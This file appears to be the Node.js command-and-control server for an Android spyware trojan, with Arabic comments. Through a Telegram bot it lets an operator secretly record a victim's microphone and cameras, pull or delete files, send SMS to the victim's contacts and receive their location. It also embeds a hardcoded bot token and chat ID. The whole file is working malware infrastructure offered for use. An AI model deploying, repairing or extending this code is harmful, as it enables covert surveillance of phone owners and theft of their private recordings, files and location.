const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const bot = new TelegramBot(token, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

// إنشاء مجلد للملفات المؤقتة
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

let currentUuid = '';
let currentNumber = '';

// Routes
app.get('/', (req, res) => {
    res.send('<h1 align="center">✅ النظام يعمل</h1>');
});

// ⭐⭐ إصلاح استقبال الملفات - جميع الأنواع
app.post('/uploadFile', upload.single('file'), (req, res) => {
    try {
        const filename = req.file.originalname;
        const model = req.headers.model || 'Unknown';
        const fileType = req.headers.file_type || 'file';
        
        console.log(`📁 استقبال ملف: ${filename} من ${model} نوع: ${fileType}`);
        
        // تحديد نوع المحتوى بناء على امتداد الملف
        let contentType = 'application/octet-stream';
        if (filename.endsWith('.mp3') || filename.endsWith('.m4a') || filename.endsWith('.aac')) {
            contentType = 'audio/mpeg';
        } else if (filename.endsWith('.jpg') || filename.endsWith('.jpeg') || filename.endsWith('.png')) {
            contentType = 'image/jpeg';
        } else if (filename.endsWith('.txt') || filename.endsWith('.log')) {
            contentType = 'text/plain';
        }
        
        // حفظ الملف مؤقتاً
        const tempPath = path.join(tempDir, filename);
        fs.writeFileSync(tempPath, req.file.buffer);
        
        // إرسال حسب نوع الملف
        if (fileType === 'audio' || filename.includes('recording') || filename.includes('mic')) {
            bot.sendAudio(id, req.file.buffer, {
                caption: `🎤 تسجيل صوتي من: <b>${model}</b>\n📄 ${filename}`,
                parse_mode: 'HTML'
            }).then(() => {
                console.log(`✅ تم إرسال التسجيل الصوتي: ${filename}`);
                fs.unlinkSync(tempPath); // حذف الملف المؤقت
            }).catch(err => {
                console.error(`❌ خطأ في إرسال الصوت: ${err}`);
                // حاول إرساله كملف عادي إذا فشل
                bot.sendDocument(id, req.file.buffer, {
                    caption: `🎤 تسجيل صوتي من: <b>${model}</b>\n📄 ${filename}`,
                    parse_mode: 'HTML'
                }, { filename: filename, contentType: contentType })
                .then(() => fs.unlinkSync(tempPath))
                .catch(err2 => console.error(`❌ فشل إرسال الملف: ${err2}`));
            });
        } 
        else if (fileType === 'image' || filename.includes('camera') || filename.includes('photo')) {
            bot.sendPhoto(id, req.file.buffer, {
                caption: `📸 صورة من: <b>${model}</b>\n📄 ${filename}`,
                parse_mode: 'HTML'
            }).then(() => {
                console.log(`✅ تم إرسال الصورة: ${filename}`);
                fs.unlinkSync(tempPath);
            }).catch(err => {
                console.error(`❌ خطأ في إرسال الصورة: ${err}`);
                bot.sendDocument(id, req.file.buffer, {
                    caption: `📸 صورة من: <b>${model}</b>\n📄 ${filename}`,
                    parse_mode: 'HTML'
                }, { filename: filename, contentType: contentType })
                .then(() => fs.unlinkSync(tempPath))
                .catch(err2 => console.error(`❌ فشل إرسال الملف: ${err2}`));
            });
        }
        else {
            // ملف عادي
            bot.sendDocument(id, req.file.buffer, {
                caption: `📁 ملف من: <b>${model}</b>\n📄 ${filename}`,
                parse_mode: 'HTML'
            }, { filename: filename, contentType: contentType })
            .then(() => {
                console.log(`✅ تم إرسال الملف: ${filename}`);
                fs.unlinkSync(tempPath);
            })
            .catch(err => console.error(`❌ فشل إرسال الملف: ${err}`));
        }
        
        res.send('OK');
    } catch (error) {
        console.error('❌ خطأ في معالجة الملف:', error);
        res.status(500).send('Error');
    }
});

// ⭐⭐ إضافة route خاص للتسجيلات الصوتية
app.post('/uploadAudio', upload.single('audio'), (req, res) => {
    try {
        const filename = req.file.originalname;
        const model = req.headers.model || 'Unknown';
        const duration = req.headers.duration || 'Unknown';
        
        console.log(`🎤 استقبال تسجيل صوتي: ${filename} مدة: ${duration} ثانية`);
        
        bot.sendAudio(id, req.file.buffer, {
            caption: `🎤 تسجيل صوتي من: <b>${model}</b>\n⏱️ المدة: ${duration} ثانية\n📄 ${filename}`,
            parse_mode: 'HTML'
        }).then(() => {
            console.log(`✅ تم إرسال التسجيل الصوتي بنجاح`);
        }).catch(err => {
            console.error(`❌ خطأ في إرسال الصوت: ${err}`);
            // بديل: إرسال كملف
            bot.sendDocument(id, req.file.buffer, {
                caption: `🎤 تسجيل صوتي من: <b>${model}</b>\n⏱️ ${duration} ثانية\n📄 ${filename}`,
                parse_mode: 'HTML'
            }, { filename: filename, contentType: 'audio/mpeg' });
        });
        
        res.send('OK');
    } catch (error) {
        console.error('❌ خطأ في معالجة التسجيل:', error);
        res.status(500).send('Error');
    }
});

// ⭐⭐ إضافة route خاص للصور
app.post('/uploadImage', upload.single('image'), (req, res) => {
    try {
        const filename = req.file.originalname;
        const model = req.headers.model || 'Unknown';
        const cameraType = req.headers.camera_type || 'Unknown';
        
        console.log(`📸 استقبال صورة: ${filename} من كاميرا: ${cameraType}`);
        
        bot.sendPhoto(id, req.file.buffer, {
            caption: `📸 صورة من: <b>${model}</b>\n🎯 ${cameraType}\n📄 ${filename}`,
            parse_mode: 'HTML'
        }).then(() => {
            console.log(`✅ تم إرسال الصورة بنجاح`);
        }).catch(err => {
            console.error(`❌ خطأ في إرسال الصورة: ${err}`);
            bot.sendDocument(id, req.file.buffer, {
                caption: `📸 صورة من: <b>${model}</b>\n🎯 ${cameraType}\n📄 ${filename}`,
                parse_mode: 'HTML'
            }, { filename: filename, contentType: 'image/jpeg' });
        });
        
        res.send('OK');
    } catch (error) {
        console.error('❌ خطأ في معالجة الصورة:', error);
        res.status(500).send('Error');
    }
});

app.post('/uploadText', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendMessage(id, `📝 رسالة من: <b>${model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendLocation(id, req.body.lat, req.body.lon);
    bot.sendMessage(id, `📍 موقع من: <b>${model}</b>`, { parse_mode: 'HTML' });
    res.send('');
});

// WebSocket Connection
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { 
        model, 
        battery, 
        version, 
        brightness, 
        provider,
        connection: ws
    });
    
    console.log(`✅ جهاز متصل: ${model}`);
    
    bot.sendMessage(id, 
        `🆕 جهاز جديد متصل\n\n` +
        `📱 <b>${model}</b>\n` +
        `🔋 <b>${battery}%</b>\n` +
        `🤖 <b>${version}</b>\n` +
        `🆔 <code>${uuid}</code>`, 
        { parse_mode: 'HTML' }
    );
    
    ws.on('close', () => {
        console.log(`❌ انقطع: ${model}`);
        bot.sendMessage(id, `❌ انقطع: <b>${model}</b>`, { parse_mode: 'HTML' });
        clients.delete(uuid);
    });
    
    ws.on('error', (error) => {
        console.error(`❌ خطأ في الاتصال: ${error}`);
    });
});

// ⭐⭐ إضافة معالجة للرسائل من التطبيق عبر WebSocket
wss.on('connection', (ws, req) => {
    // ... الكود السابق للاتصال
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log(`📩 رسالة من التطبيق:`, data);
            
            if (data.type === 'log') {
                console.log(`📝 سجل من التطبيق: ${data.message}`);
            }
            else if (data.type === 'error') {
                console.error(`❌ خطأ من التطبيق: ${data.message}`);
                bot.sendMessage(id, `❌ خطأ في التطبيق: ${data.message}`);
            }
            else if (data.type === 'status') {
                console.log(`📊 حالة من التطبيق: ${data.message}`);
                bot.sendMessage(id, `📊 ${data.message}`);
            }
        } catch (error) {
            // إذا لم تكن JSON، تعامل معها كسلسلة نصية عادية
            console.log(`📩 رسالة نصية من التطبيق: ${message}`);
        }
    });
});

// باقي الكود يبقى كما هو من الإصدار السابق (معالجة الأوامر)
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    
    if (msg.reply_to_message) {
        if (msg.reply_to_message.text.includes('يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه')) {
            currentNumber = msg.text;
            bot.sendMessage(id, 'رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم', { reply_markup: { force_reply: true } });
        }
        
        if (msg.reply_to_message.text.includes('رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${msg.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل مسار الملف الذي تريد تنزيله')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل مسار الملف الذي تريد حذفه')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        // ⭐⭐ المايكرفون - مع إشعار بالبداية
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
            const duration = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    // إرسال إشعار بالبداية
                    bot.sendMessage(id, `🎤 بدء التسجيل الصوتي لمدة ${duration} ثانية...`);
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• جاري التسجيل الصوتي...\nسيتم إرسال الملف بعد الانتهاء', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        // ⭐⭐ الكاميرا الأمامية
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الأمامية فيها')) {
            const duration = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    bot.sendMessage(id, `📸 بدء تسجيل الكاميرا الأمامية لمدة ${duration} ثانية...`);
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• جاري تسجيل الكاميرا...\nسيتم إرسال الملف بعد الانتهاء', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        // ⭐⭐ الكاميرا الخلفية
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الخلفية فيها')) {
            const duration = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    bot.sendMessage(id, `📷 بدء تسجيل الكاميرا الخلفية لمدة ${duration} ثانية...`);
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• جاري تسجيل الكاميرا...\nسيتم إرسال الملف بعد الانتهاء', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
    }
    
    if (id == chatId) {
        if (msg.text == '/start') {
            bot.sendMessage(id, '• • مرحبا بك في النظام\n\n' +
                '• نظام إدارة الأجهزة المتقدمة\n\n' +
                '• اختر من القائمة:', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.text == '📱 الأجهزة المتصلة') {
            if (clients.size == 0) {
                bot.sendMessage(id, '• لا تتوفر أجهزة توصيل ❌\n\n');
            } else {
                let devicesList = '• قائمة الأجهزة المتصلة:\n\n';
                clients.forEach(function(value, key, map) {
                    devicesList += `• الطراز: <b>${value.model}</b>\n` +
                        `• البطارية: <b>${value.battery}</b>\n` +
                        `• الأندرويد: <b>${value.version}</b>\n\n`;
                });
                bot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
            }
        }
        
        if (msg.text == '📋 قائمة الأوامر') {
            if (clients.size == 0) {
                bot.sendMessage(id, '• لا تتوفر أجهزة توصيل ❌\n\n');
            } else {
                const deviceButtons = [];
                clients.forEach(function(value, key, map) {
                    deviceButtons.push([{ text: value.model, callback_data: `device:${key}` }]);
                });
                bot.sendMessage(id, '• حدد الجهاز لتنفيذ الأوامر', {
                    reply_markup: { inline_keyboard: deviceButtons }
                });
            }
        }
    }
});

// ... باقي كود الـ callback queries يبقى كما هو

// بدء الخادم
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
    console.log(`📁 مجلد الملفات المؤقتة: ${tempDir}`);
});

// تنظيف الملفات المؤقتة كل ساعة
setInterval(() => {
    try {
        const files = fs.readdirSync(tempDir);
        const now = Date.now();
        files.forEach(file => {
            const filePath = path.join(tempDir, file);
            const stats = fs.statSync(filePath);
            if (now - stats.mtime.getTime() > 3600000) { // أقدم من ساعة
                fs.unlinkSync(filePath);
                console.log(`🧹 تم حذف الملف المؤقت: ${file}`);
            }
        });
    } catch (error) {
        console.error('❌ خطأ في التنظيف:', error);
    }
}, 3600000);

// معالجة الأخطاء
bot.on('error', (error) => {
    console.error('❌ خطأ في البوت:', error);
});

bot.on('polling_error', (error) => {
    console.error('❌ خطأ في الاتصال:', error);
});
